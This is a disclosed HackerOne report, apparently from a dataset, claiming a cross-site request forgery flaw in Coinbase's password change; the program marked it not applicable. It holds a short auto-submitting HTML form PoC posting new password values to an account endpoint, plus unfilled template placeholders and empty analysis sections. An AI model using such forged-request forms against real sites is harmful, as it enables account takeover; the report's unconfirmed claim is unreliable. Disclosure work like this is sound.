---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '230436'
original_report_id: '230436'
title: CSRF bug on password change
weakness: Cross-Site Request Forgery (CSRF)
team_handle: coinbase
created_at: '2017-05-21T10:36:04.166Z'
disclosed_at: '2017-08-28T17:39:14.683Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 0
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF bug on password change

## Metadata

- HackerOne Report ID: 230436
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: coinbase
- Disclosed At: 2017-08-28T17:39:14.683Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, researchers are more likely to earn a larger bounty by explaining how a vulnerability can be exploited to cause harm to Coinbase or its users.

**Summary:** Attacker can change password without user permission

**Description:**HI I found csrf bug on password changing session. It can be dangerous for user. Cause attacker can change password with out user permission. CSRF POC is below :-

<html>
  <body>
    <form action="https://www.coinbase.com/users/59215b8f0ec7c37a4ca27b00/password_reset" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="old&#95;password" value="dadaboji1" />
      <input type="hidden" name="password" value="dadaboji" />
      <input type="hidden" name="password&#95;confirmation" value="dadaboji" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Browsers Verified In:

  * [firefox 45.9.0]
  * [add each browser and version number tested in]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. [Intercept with burpsuite. After change password click]
  1. [Make CSRF POC with burpsuite]
  1. [change data]

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
